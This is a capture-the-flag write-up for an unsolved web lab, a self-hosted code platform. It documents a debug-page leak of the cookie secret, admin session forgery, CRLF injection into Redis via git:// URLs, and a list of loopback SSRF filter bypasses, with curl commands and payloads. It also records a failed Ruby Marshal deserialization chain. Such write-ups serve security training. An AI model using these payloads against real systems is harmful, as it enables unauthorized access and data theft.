# Writeup: [Partner] repoforge — **UNSOLVED**

- Category: Web
- Status: unsolved

## Challenge

> Partner lab on HackAdvisor. RepoForge is a small self-hosted code platform.

## Recon

The live lab I worked on was:

```text
https://e4f1ddd8-1a25-46b0-8be0-feb48b6d5065.labs.hackadvisor.io/
```

Test credentials:

```text
user@test.com / password123
```

The app is a Sinatra 3.2.0 / Puma 6.6.1 / sqlite3 1.7.3 / Sidekiq stack on
Ruby 3.2.0, with `show_exceptions` enabled.

## What Worked

### 1. Dev error page leaks the encrypted-cookie secret

`POST /profile` with array params crashes sqlite and renders the full Sinatra
debug page.

Example:

```sh
curl -skc /tmp/repoforge.jar "$BASE/login" >/dev/null
curl -skb /tmp/repoforge.jar -c /tmp/repoforge.jar \
  -X POST "$BASE/login" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'email=user@test.com&password=password123' >/dev/null

curl -skb /tmp/repoforge.jar \
  -X POST "$BASE/profile" \
  -H 'Accept: text/html' \
  -H "Origin: $BASE" \
  --data 'username[]=a&username[]=b'
```

Leaked values on the current instance:

```text
secret = 847436f8fe44d8d8aca0b0d218373fe2386da923749612d9bdf8ba7debe2018c
session_id = e7be43ec98ac662121c7c8cf23722ffa59fe9340989801716299732ecca9a258
csrf = fS8I0vxPQvz-B7t7P1wo7wIpOWr9BYySxEEs7MX_cgQ=
user agent = curl/8.7.1
```

### 2. Forging `rack.session` gives admin

The cookie is AES-GCM over `Marshal.dump(session_hash)`. Reusing the leaked
`session_id`, `csrf`, and `tracking.HTTP_USER_AGENT`, and changing `user_id`
to `1`, produces a working admin cookie for `/admin/jobs`.

### 3. `git://127.1:6379` gives arbitrary Redis commands

`POST /api/projects/import` accepts `git://` URLs. CRLF in the git path is
sent verbatim to the TCP target, so Redis can be driven with inline commands.

Example:

```text
git://127.1:6379/%0D%0AINFO%0D%0AQUIT%0D%0A
```

That gives arbitrary Redis reads and writes.

### 4. The HTTP SSRF filter is bypassable

`http://127.0.0.1:8080/` is blocked, but equivalent loopback forms work:

```text
http://127.1:8080/
http://127.0.1:8080/
http://2130706433:8080/
http://0177.1:8080/
http://0x7f.1:8080/
http://0.0.0.0:8080/
http://localhost:8080/
http://[::ffff:127.0.0.1]:8080/
```

This is a real HTTP SSRF, not the earlier raw-git socket trick.

Examples:

```text
http://127.1:8080/login      -> HTTP 200 with the login page body
http://127.1:8080/register   -> HTTP 200 with the registration page body
http://127.1:8080/admin/jobs -> HTTP 302
http://127.1:8080/nope       -> HTTP 404 with the app's custom 404 page
```

### 5. Multi-frame error pages leak `server.rb` structure

I initially only looked at the first app frame. The useful part is that the
Sinatra page often contains multiple `/app/server.rb` frames.

With a forged session whose `user_id` is an Array, `/`, `/projects`,
`/profile`, and `/admin/jobs` all crash in `current_user` and leak:

```ruby
@db ||= SQLite3::Database.new(DB_PATH)
@db.results_as_hash = true
@db
end

def current_user
  return nil unless session[:user_id]
  @current_user ||= db.execute("SELECT * FROM users WHERE id = ?", session[:user_id]).first
end

def require_auth!
  redirect '/login' unless current_user
end

def require_admin!
```

The second app frame on the same trace leaks:

```ruby
before do
  @current_user = current_user
end

get '/login' do
  erb :login, layout: :layout
end

post '/login' do
```

The `/profile` sqlite crash leaks the later route block:

```ruby
@ssh_keys = db.execute("SELECT * FROM ssh_keys WHERE user_id = ?", current_user['id'])
@tokens = db.execute("SELECT id, name, created_at, last_used FROM access_tokens WHERE user_id = ?", current_user['id'])
erb :profile, layout: :layout
end

post '/profile' do
  require_auth!
  db.execute("UPDATE users SET username = ?, bio = ? WHERE id = ?",
    params[:username], params[:bio], current_user['id'])
  redirect '/profile'
end

get '/admin/jobs' do
  require_admin!
  begin
```

## Dead Ends

### Redis

I re-checked Redis properly by sending `SELECT n`, `DBSIZE`, and `KEYS *` in
the same connection. Only DB 0 had data:

```text
worker:repoforge-worker:13:started
stat:processed
stat:failed
queues
workers
```

DB 1 through DB 15 were empty.

`stat:processed = 882`, `stat:failed = 23`, `queues` is a set, `workers` is a
set, and `worker:repoforge-worker:13:started` is a string.

No flag-like data was present in Redis.

### Sidekiq worker abuse

I could enqueue `RepositoryCloneWorker`, `PipelineRunWorker`,
`WebhookDeliveryWorker`, and `ProjectExportWorker` jobs through Redis, but the
dashboard behavior was largely cosmetic:

- clone/export often report success on nonsense args
- direct webhook URL jobs report `delivered` even for obviously bad inputs
- `/admin/jobs` has no per-job detail route or traceback view

The only genuinely interesting signals in the dashboard were seeded failures
such as:

```text
Test suite timeout after 300s
Connection refused: discord webhook endpoint
```

That was not enough to pivot to the flag.

### Marshal RCE

`Rack::Protection::EncryptedCookie::Marshal#decode` really is
`Marshal.load(plaintext)`, so unsafe deserialization is real.

I tried the standard Ruby gadget path through:

```text
Gem::SpecFetcher
Gem::Version
Gem::RequestSet::Lockfile
Gem::Source::Git
```

On Ruby 3.2.0 it reaches `Gem::Source::Git#rev_parse`, but dies before command
execution because `Dir.chdir(repo_cache_dir)` happens first:

```text
Errno::ENOENT: No such file or directory @ dir_chdir -
/tmp/cache/bundler/git/any-c5fe0200d1c7a5139bd18fd22268c4ca8bf45e90
```

That blocks the common universal chain unless the missing git cache directory
is created first. I did not find a clean way to do that on this build.

### Hidden routes

The real SSRF bypass let me probe loopback over HTTP, but the expected local
or hidden route never materialized.

Interesting non-404s were:

```text
/login
/register
/logout
/admin/jobs   -> redirect
```

Most obvious local-only guesses returned the same custom 404 page.

### Repository content / export paths

I brute-forced the usual project-content and export URLs:

```text
/projects/:id/raw/...
/projects/:id/blob/main/...
/projects/:id/archive
/projects/:id/export
/exports/*.tar.gz
/downloads/*.tar.gz
```

Nothing useful was exposed.

## Assessment

This challenge exposes several real bugs:

1. debug-page secret disclosure
2. admin cookie forgery
3. arbitrary `Marshal.load`
4. Redis command injection through `git://`
5. HTTP SSRF to loopback with non-canonical localhost forms

But after chaining all of them, I still did not reach a flag-bearing asset or
a stable code-execution path. At this point I consider the lab underconstrained
or simply badly finished.

## Flag

```text
UNSOLVED
```
